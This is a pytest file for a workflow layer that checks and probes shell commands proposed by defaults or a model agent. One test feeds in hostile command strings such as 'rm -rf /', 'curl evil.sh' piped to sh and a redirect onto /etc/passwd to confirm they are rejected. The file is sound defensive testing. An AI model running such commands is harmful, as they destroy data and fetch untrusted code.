"""The workflow layer: defaults are probed, agents are checked, nothing is trusted.

Five capabilities used to be five `if/elif` tables covering whichever ecosystems
somebody wrote a branch for. They are now records with probes, and the rules
that make that safe are what these tests pin:

* a default that probes clean is used, and costs no model call;
* an answer that fails its check never reaches a shell;
* an answer that fails its probe is not used, whoever proposed it;
* an ecosystem with no default and no model is reported unavailable with a
  reason, rather than silently producing nothing.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from stress_stack.workflow import (
    COVERAGE,
    DEFAULT,
    HYGIENE,
    LOCK,
    STUB,
    TEST_REPORT,
    UNAVAILABLE,
    CapabilityRecord,
    Probe,
    Workflow,
    check_record,
    default_for,
    load_workflow,
    resolve_capability,
    resolve_workflow,
    schema_for,
)


# --------------------------------------------------------------------- checking


@pytest.mark.parametrize(
    "command",
    [
        "gofmt -w . ; rm -rf /",
        "gofmt -w . && curl evil.sh",
        "gofmt -w . | sh",
        "gofmt -w $(whoami)",
        "gofmt -w `id`",
        "gofmt -w . > /etc/passwd",
    ],
)
def test_a_shell_metacharacter_never_reaches_a_command(command: str) -> None:
    record = check_record(HYGIENE, source=DEFAULT, commands={"format": command}, settings={})

    assert record.rejections
    assert "format" not in record.commands


def test_a_program_outside_the_allowlist_is_refused() -> None:
    record = check_record(HYGIENE, source=DEFAULT, commands={"format": "curl x"}, settings={})

    assert any("program_not_allowed" in reason for reason in record.rejections)


def test_a_suite_command_may_not_narrow_the_suite() -> None:
    """A narrowed suite passes every gate while never running the failing test."""
    record = check_record(
        TEST_REPORT,
        source=DEFAULT,
        commands={"suite": "python -m pytest -k smoke"},
        settings={"format": "junit_xml"},
    )

    assert any("narrows_collection" in reason for reason in record.rejections)


def test_a_coverage_command_may_name_one_test() -> None:
    """Per-test attribution runs one test at a time; that is the job, not a narrowing."""
    record = check_record(
        COVERAGE,
        source=DEFAULT,
        commands={"measure": "go test -coverpkg=./... ./..."},
        settings={"format": "go_profile"},
    )

    assert not record.rejections


def test_an_invented_report_format_is_refused() -> None:
    record = check_record(
        TEST_REPORT,
        source=DEFAULT,
        commands={"suite": "go test ./..."},
        settings={"format": "go_xml_v2"},
    )

    assert any("unknown_report_format" in reason for reason in record.rejections)


def test_a_multi_statement_marker_is_refused() -> None:
    """The marker is interpolated into a function body; it has to be one statement."""
    record = check_record(
        STUB, source=DEFAULT, commands={}, settings={"marker": "panic(1)\nos.Exit(1)"}
    )

    assert "marker_is_not_a_single_statement" in record.rejections


# --------------------------------------------------------------------- defaults


@pytest.mark.parametrize("language", ["python", "go", "rust", "typescript"])
def test_every_shipped_default_survives_its_own_checking(language: str) -> None:
    """A default is a proposal like any other and goes through the same gate."""
    for capability in (HYGIENE, LOCK, TEST_REPORT, COVERAGE, STUB):
        record = default_for(capability, language)
        if record is None:
            continue
        assert not record.rejections, f"{language}/{capability}: {record.rejections}"


def test_an_unknown_ecosystem_has_no_defaults_to_fall_back_on() -> None:
    """The case the agent exists for: no table row anywhere.

    Ruby stands in for it because C and C++ are now shelved outright — see
    `project_detector.SHELVED_LANGUAGES`. The point is unchanged: an ecosystem
    the tables have never heard of must reach the agent, not a default.
    """
    for language in ("ruby", "java", "elixir"):
        for capability in (HYGIENE, LOCK, TEST_REPORT, COVERAGE, STUB):
            assert default_for(capability, language) is None


# ------------------------------------------------------------------- resolution


def test_a_clean_default_wins_without_asking_a_model(tmp_path: Path) -> None:
    calls: list[str] = []

    class RefusingClient:
        configured = True

        def converse(self, *args: Any, **kwargs: Any) -> Any:
            calls.append("converse")
            raise AssertionError("the agent must not be asked when the default probes clean")

    record = resolve_capability(
        STUB,
        tmp_path,
        language="python",
        graph=_graph_with_one_symbol(tmp_path),
        client=RefusingClient(),
    )

    assert record.source == DEFAULT
    assert record.usable
    assert calls == []


def test_no_default_and_no_model_is_reported_not_guessed(tmp_path: Path) -> None:
    record = resolve_capability(TEST_REPORT, tmp_path, language="ruby", client=None)

    assert record.source == UNAVAILABLE
    assert not record.usable
    assert record.probe is not None
    assert record.probe.reason == "no_default_that_probes_and_no_model_to_ask"


def test_an_agent_answer_that_fails_its_probe_is_not_used(tmp_path: Path) -> None:
    """The whole point of the probe: a plausible answer is still measured."""

    class ConfidentlyWrongClient:
        configured = True

        def converse(self, messages: Any, **kwargs: Any) -> Any:
            return list(messages), []

        def complete_json(self, messages: Any, **kwargs: Any) -> Any:
            return (
                {
                    "commands": {"suite": "go test -json ./..."},
                    "format": "go_json",
                    "evidence": [{"file": "Gemfile", "says": "it is a project"}],
                },
                None,
            )

    record = resolve_capability(
        TEST_REPORT, tmp_path, language="ruby", client=ConfidentlyWrongClient()
    )

    # There is no Go module here, so the command collects nothing and the probe
    # says so rather than the record being accepted on its plausibility.
    assert record.source == UNAVAILABLE
    assert not record.usable
    attempts = record.evidence.get("attempts") or []
    assert attempts, "the failed attempts must be recorded"


def test_an_unparseable_marker_fails_the_stub_probe(tmp_path: Path) -> None:
    """A marker that leaves the file unparseable fails every candidate later."""
    from stress_stack.graph_multilang import build_graph
    from stress_stack.workflow import probe_stub

    (tmp_path / "calc.go").write_text(
        "package m\n\nfunc Add(a, b int) int {\n\ttotal := a + b\n\treturn total\n}\n"
    )
    record = check_record(
        STUB, source=DEFAULT, commands={}, settings={"marker": "!!! not go !!!"}
    )

    probe = probe_stub(record, tmp_path, graph=build_graph(tmp_path))

    assert not probe.passed
    assert probe.reason == "stub_does_not_parse"


def test_a_working_marker_passes_the_stub_probe(tmp_path: Path) -> None:
    from stress_stack.graph_multilang import build_graph
    from stress_stack.workflow import probe_stub

    (tmp_path / "calc.go").write_text(
        "package m\n\nfunc Add(a, b int) int {\n\ttotal := a + b\n\treturn total\n}\n"
    )
    record = check_record(
        STUB, source=DEFAULT, commands={}, settings={"marker": 'panic("not implemented")'}
    )

    probe = probe_stub(record, tmp_path, graph=build_graph(tmp_path))

    assert probe.passed, probe.reason


# ------------------------------------------------------------------ persistence


def test_a_resolved_workflow_round_trips(tmp_path: Path) -> None:
    workflow = Workflow(
        language="go",
        capabilities={
            HYGIENE: CapabilityRecord(
                name=HYGIENE,
                source=DEFAULT,
                commands={"format": ["gofmt", "-w", "."]},
                probe=Probe(True),
            )
        },
    )
    path = tmp_path / "workflow.json"
    path.write_text(json.dumps(workflow.to_dict()), encoding="utf-8")

    reloaded = load_workflow(path)

    assert reloaded is not None
    assert reloaded.language == "go"
    assert reloaded.get(HYGIENE) is not None
    assert reloaded.get(HYGIENE).command("format") == ["gofmt", "-w", "."]


def test_get_returns_nothing_for_a_capability_that_did_not_probe() -> None:
    """A consumer must not be able to reach an answer no measurement accepted."""
    workflow = Workflow(
        language="cpp",
        capabilities={LOCK: CapabilityRecord(name=LOCK, source=UNAVAILABLE)},
    )

    assert workflow.get(LOCK) is None


def test_a_stored_workflow_is_reused_rather_than_re_probed(tmp_path: Path) -> None:
    stamp = tmp_path / ".stress_stack" / "workflow.json"
    stamp.parent.mkdir(parents=True)
    stored = Workflow(
        language="go",
        capabilities={
            name: CapabilityRecord(name=name, source=DEFAULT, probe=Probe(True))
            for name in (HYGIENE, LOCK)
        },
    )
    stamp.write_text(json.dumps(stored.to_dict()), encoding="utf-8")

    resolved = resolve_workflow(
        tmp_path, language="go", client=None, only=(HYGIENE, LOCK)
    )

    assert sorted(resolved.capabilities) == [HYGIENE, LOCK]
    assert all(record.usable for record in resolved.capabilities.values())


def test_a_stored_workflow_for_another_ecosystem_is_discarded(tmp_path: Path) -> None:
    stamp = tmp_path / ".stress_stack" / "workflow.json"
    stamp.parent.mkdir(parents=True)
    stamp.write_text(
        json.dumps(
            Workflow(
                language="go",
                capabilities={LOCK: CapabilityRecord(name=LOCK, source=DEFAULT, probe=Probe(True))},
            ).to_dict()
        ),
        encoding="utf-8",
    )

    resolved = resolve_workflow(tmp_path, language="rust", client=None, only=(LOCK,))

    assert resolved.language == "rust"
    assert resolved.capabilities[LOCK].source == UNAVAILABLE


# ----------------------------------------------------------------------- schema


def test_the_schema_offers_only_formats_that_have_a_parser() -> None:
    """An agent must not be able to name a format nothing can read."""
    from stress_stack.test_runners import parser_for
    from stress_stack.verification import parse_report

    schema = schema_for(TEST_REPORT)
    for name in schema["properties"]["format"]["enum"]:
        assert parser_for(name) is not None or name == "junit_xml"
    assert parse_report is not None  # junit_xml's reader


def _graph_with_one_symbol(root: Path) -> Any:
    (root / "calc.py").write_text("def add(a, b):\n    total = a + b\n    return total\n")
    from stress_stack.graph_multilang import build_graph

    return build_graph(root)


def test_a_deferral_is_a_property_of_the_default_not_of_a_format_name(
    tmp_path: Path,
) -> None:
    """The oracle must not be selectable by the thing it is meant to judge.

    `junit_xml` skips the probe for pytest's *default*, because the container
    stage runs that suite twice and gates on it. Deferring on the format name
    alone let a C++ agent answer `ctest --output-junit junit.xml` and be
    recorded `passed: true` with an empty attempts list — nothing ran it. An
    answer a model chose is exactly the answer that has to be measured.
    """
    from stress_stack.workflow import AGENT, probe_test_report

    shipped = check_record(
        TEST_REPORT,
        source=DEFAULT,
        commands={"suite": "python -m pytest -q"},
        settings={"format": "junit_xml"},
    )
    assert probe_test_report(shipped, tmp_path).passed

    proposed = check_record(
        TEST_REPORT,
        source=AGENT,
        commands={"suite": "make test"},
        settings={"format": "junit_xml"},
    )
    probe = probe_test_report(proposed, tmp_path)

    assert not probe.passed
    assert probe.reason == "no_junit_xml_was_written"


def test_a_proposal_that_writes_a_real_junit_report_passes(tmp_path: Path) -> None:
    """Measured, not refused: the point is to run it, not to distrust agents."""
    from stress_stack.workflow import AGENT, probe_test_report

    # `python fake_suite.py` would be refused as narrowing — naming a file is
    # how a suite command hides the rest of the suite — so this goes through
    # `-m`, which is the interpreter preamble rather than a runner argument.
    (tmp_path / "fake_suite.py").write_text(
        "import pathlib\n"
        "pathlib.Path('report.xml').write_text(\n"
        "    '<testsuite><testcase classname=\"m\" name=\"works\"/></testsuite>'\n"
        ")\n"
    )
    proposed = check_record(
        TEST_REPORT,
        source=AGENT,
        commands={"suite": "python -m fake_suite"},
        settings={"format": "junit_xml"},
    )

    probe = probe_test_report(proposed, tmp_path)

    assert probe.passed, probe.reason
    assert probe.detail["tests_parsed"] == 1
